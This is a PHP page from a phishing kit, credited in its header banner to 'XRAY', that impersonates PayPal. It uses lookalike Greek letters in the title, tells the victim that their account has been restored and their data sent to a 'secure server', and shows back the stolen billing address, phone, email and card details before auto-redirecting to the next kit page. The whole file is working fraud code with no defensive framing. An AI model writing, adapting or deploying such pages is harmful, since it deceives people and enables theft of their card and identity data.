<?php

#################################################
#                                               #
#            ||~~ BY ~~ XRAY ~~||             #
#                                               #
#            ||~  ~||             #
#                                               #
#################################################

session_start();
$icon_card = "pp.png";
if(isset($_SESSION['c_type'] )) {
if ( $_SESSION['c_type'] == "amex") { $icon_card = "ae.png";}
if ( $_SESSION['c_type'] == "jcb") { $icon_card = "jc.png";}
if ( $_SESSION['c_type'] == "diners_club_carte_blanche") { $icon_card = "ae.png";}
if ( $_SESSION['c_type'] == "diners_club_international") { $icon_card = "ae.png";}
if ( $_SESSION['c_type'] == "visa") { $icon_card = "v.png";}
if ( $_SESSION['c_type'] == "visa_electron") { $icon_card = "v.png";}
if ( $_SESSION['c_type'] == "mastercard") { $icon_card = "mc.png";}
if ( $_SESSION['c_type'] == "maestro") { $icon_card = "ms.png";}
if ( $_SESSION['c_type'] == "discover") { $icon_card = "d.png";}
 }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sending your information to ΡayΡal</title>
    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/style.css">
	<script src="javascript/jquery-1.11.2.min.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
	<meta http-equiv="refresh" content="5; url=J3.php">
<style>
#msg {
	margin-top: 5px;
	border: 1px solid #3399ff;
	font-size: 14px;
	font-weight: bold;
	padding-top: 5px;
	padding-bottom: 5px;
	padding-right: 10px;
	padding-left: 10px;
	border-radius: 5px;
}
</style>
</head>
<body>
<div id="header">
	<div class="wrapper">
		<img class="logo" src="imgs/logo_Safety.png" />
		<p>Your security is our priority</p>
	</div>
</div>
<div class="wrapper">
	<div id="acc">
	<h1>Congratulations !</h1>
		<p>
Your have restored your account access. Now you can use your account as usual.
all information had been sent in encrypted form to our secure server. Thank you for using Paypal.
		</p>
		<center><img src="imgs/congratulations.png" /></center>
		<h5 class="fleft">Billing Address</h5>
		<div id="hidethis">
		<br clear="all">
        <p>
		<?=$_SESSION['_fname_']." ".$_SESSION['_lname_']."<br />".
		$_SESSION['_adds1_']."<br />";
		if ($_SESSION['_adds2_']){ echo $_SESSION['_adds2_']."<br />";}
		echo $_SESSION['_city_']." ".$_SESSION['_state_']." ".$_SESSION['_zip_']."<br />".
		$_SESSION['cntname']."<br /><br />".
		$_SESSION['_phone_']."<br />".
		$_SESSION['_email_']."<br />"; ?>
		</p>
		</div>
		
	<br clear="all">
		<h5>Credit Card Information</h5>
		<div id="msg">
		<table border="0" width="100%" align="center">
		<tr>
		<td align="center" valign="top"><img src="imgs/icons/<?=$icon_card?>" /></td>
		<td align="center" valign="middle" ><h4>XXXX XXXX XXXX  <?=substr($_SESSION['ccn'] , -4);?></h4></td>
		<td align="center" valign="middle"><h4><?=$_SESSION['edmonth']."/20".$_SESSION['edyear']?></h4></td>
		</tr>
		</table>
		</div>
		<br clear="all">
		<br clear="all">
		<p class="agree">If this page appears for more than 10 seconds, <a href="J3.php">click here</a> </p>
		
	</div>
</div>
	<div class="b0" >
		<hr />
	<div class="wrapper"><img src="imgs/pp.png" /></div>
	</div>
</body>
</html>